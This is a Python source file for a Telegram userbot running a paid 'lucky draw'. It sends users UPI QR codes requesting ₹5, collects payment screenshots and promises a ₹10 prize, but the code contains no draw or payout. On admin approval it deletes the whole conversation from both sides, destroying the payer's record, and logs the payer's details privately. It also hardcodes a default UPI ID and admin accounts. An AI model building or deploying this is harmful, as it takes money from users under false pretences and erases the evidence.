import asyncio
import json
import os
from datetime import datetime
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.messages import DeleteHistoryRequest
import qrcode
from PIL import Image, ImageDraw, ImageFont
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

api_id = int(os.getenv('API_ID'))
api_hash = os.getenv('API_HASH')
session_string = os.getenv('SESSION_STRING')

if not session_string:
    logger.error("SESSION_STRING is missing!")
    exit(1)

UPIS   = [x.strip() for x in os.getenv('UPIS', 'varunloves@fam').split(',')]
ADMINS = [x.strip() for x in os.getenv('ADMINS', 'VarunsLuckyDraw,8935742943').split(',')]

client = TelegramClient(StringSession(session_string), api_id, api_hash)

DATA_DIR = '/data'
os.makedirs(DATA_DIR, exist_ok=True)
PARTICIPANTS_FILE = os.path.join(DATA_DIR, 'participants.json')

if not os.path.exists(PARTICIPANTS_FILE):
    with open(PARTICIPANTS_FILE, 'w') as f:
        json.dump([], f)

user_states = {}
# Track users currently being approved so handle_private_message ignores them
approving_users = set()


async def load_participants():
    try:
        with open(PARTICIPANTS_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return []


async def save_participant(data):
    participants = await load_participants()
    participants.append(data)
    with open(PARTICIPANTS_FILE, 'w') as f:
        json.dump(participants, f, indent=4)


def generate_qr(upi, amount="5", user_id="", timestamp=""):
    upi_url = f"upi://pay?pa={upi}&pn=LuckyDraw&am={amount}&cu=INR"
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(upi_url)
    qr.make(fit=True)

    img = qr.make_image(fill_color="black", back_color="white").convert('RGB')
    draw = ImageDraw.Draw(img)

    try:
        font = ImageFont.truetype("arial.ttf", 20)
    except Exception:
        font = ImageFont.load_default()

    texts = [
        "Lucky Draw Participation",
        f"User ID: {user_id}",
        f"Time: {timestamp}",
        f"Amount: ₹{amount}"
    ]
    y = 10
    for text in texts:
        draw.text((10, y), text, fill="black", font=font)
        y += 30

    filename = os.path.join(DATA_DIR, f"qr_{user_id}_{int(datetime.now().timestamp())}.png")
    img.save(filename)
    return filename


@client.on(events.NewMessage(func=lambda e: e.is_private))
async def handle_private_message(event):
    try:
        user_id = event.sender_id

        # ── Ignore messages from users being approved right now ──
        if user_id in approving_users:
            return

        message_text = event.raw_text.strip().lower()

        if user_id in user_states and user_states[user_id] == 'normal':
            if "lucky draw join" in message_text:
                user_states[user_id] = 'waiting_yes_no'
                await event.reply(
                    "Kya Apko Lucky Draw Meh Join Hona Hei?\n\n"
                    "Agar Join Hona Hei Tho \"Yes\" Bolke Type Karke Send Karo\n"
                    "Agar Join Nahi Karna Hei Tho \"No\" Bolke Type Karke Send Karo"
                )
            return

        if user_id not in user_states:
            user_states[user_id] = 'waiting_yes_no'
            await event.reply(
                "Kya Apko Lucky Draw Meh Join Hona Hei?\n\n"
                "Agar Join Hona Hei Tho \"Yes\" Bolke Type Karke Send Karo\n"
                "Agar Join Nahi Karna Hei Tho \"No\" Bolke Type Karke Send Karo"
            )
            return

        current_state = user_states.get(user_id)

        if current_state == 'waiting_yes_no':
            if message_text == "yes":
                user_states[user_id] = 'waiting_payment'
                await event.reply(
                    "T&C\n"
                    "The account you get it will depend on your luck\n"
                    "Winner gets ₹10 in return"
                )
                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                qr_file = generate_qr(UPIS[0], "5", str(user_id), now)
                await event.reply(
                    file=qr_file,
                    message=(
                        f"Lucky Draw Participation\n"
                        f"User ID: {user_id}\n"
                        f"Time: {now}\n"
                        f"Date: {datetime.now().date()}\n\n"
                        f"After making payment send us the screenshot."
                    )
                )
            elif message_text == "no":
                user_states[user_id] = 'normal'
                await event.reply(
                    'Agar Apko Kabhitho lucky draw join karna hei tho bas "Lucky Draw Join" Bolke send karo'
                )

        elif current_state == 'waiting_payment':
            if "new qr" in message_text:
                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                qr_file = generate_qr(UPIS[0], "5", str(user_id), now)
                await event.reply(file=qr_file, message="New QR Code generated.")
            elif event.message.photo or "screenshot" in message_text:
                await event.reply("Wait for admin approval (5 minutes) ✅")
                user_states[user_id] = 'waiting_approval'
            else:
                await event.reply("Please send payment screenshot or type NEW QR")

        elif current_state == 'waiting_approval':
            await event.reply("Already waiting for admin approval.")

    except Exception as e:
        logger.error(f"Error: {e}")


@client.on(events.NewMessage(pattern=r'/approved', func=lambda e: e.is_private))
async def handle_approval(event):
    try:
        sender = await event.get_sender()
        is_admin = (
            str(event.sender_id) in ADMINS or
            (sender.username and sender.username in ADMINS)
        )
        if not is_admin:
            return

        chat_id  = event.chat_id
        user_id  = chat_id

        # Mark this user as being approved — suppresses handle_private_message
        approving_users.add(user_id)

        try:
            # ── Step 1: Delete ENTIRE chat history from BOTH sides ──
            await client(DeleteHistoryRequest(
                peer=chat_id,
                max_id=0,          # 0 = all messages
                just_clear=False,  # False = delete for both sides
                revoke=True        # revoke = remove from other side too
            ))

            # ── Step 2: Send only the approval message ──
            await client.send_message(
                chat_id,
                "You Have Successfully Participated In The Lucky Draw 👍🏻\n\n"
                "Wait For The Results To Win The Price , Good Luck 😸💗"
            )

            # ── Step 3: Save participant ──
            data = {
                "chat_id": chat_id,
                "user_id": user_id,
                "time":    datetime.now().isoformat(),
                "payment": "Approved",
                "status":  "Participated"
            }
            await save_participant(data)

            # ── Step 4: Count and get user info for Saved Messages log ──
            participants = await load_participants()
            count = len(participants)

            try:
                user_entity = await client.get_entity(user_id)
                username = f"@{user_entity.username}" if user_entity.username else "No username"
                nickname = user_entity.first_name or "No name"
            except Exception:
                username = "Unknown"
                nickname = "Unknown"

            # ── Step 5: Log to Saved Messages ──
            log_msg = (
                f"✅ #{count} Joined\n"
                f"👤 User ID : `{user_id}`\n"
                f"🔗 Username : {username}\n"
                f"📛 Nickname : {nickname}\n"
                f"🕐 Time : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            await client.send_message("me", log_msg, parse_mode="md")

            # ── Step 6: Reset user state ──
            if user_id in user_states:
                del user_states[user_id]

            logger.info(f"Approved user {user_id} — chat cleared, approval sent.")

        finally:
            # Always remove from approving set even if something fails
            approving_users.discard(user_id)

    except Exception as e:
        logger.error(f"Approval error: {e}")
        approving_users.discard(event.chat_id)


async def main():
    await client.start()
    logger.info("Lucky Draw Bot Started Successfully!")
    await client.run_until_disconnected()


if __name__ == '__main__':
    asyncio.run(main())
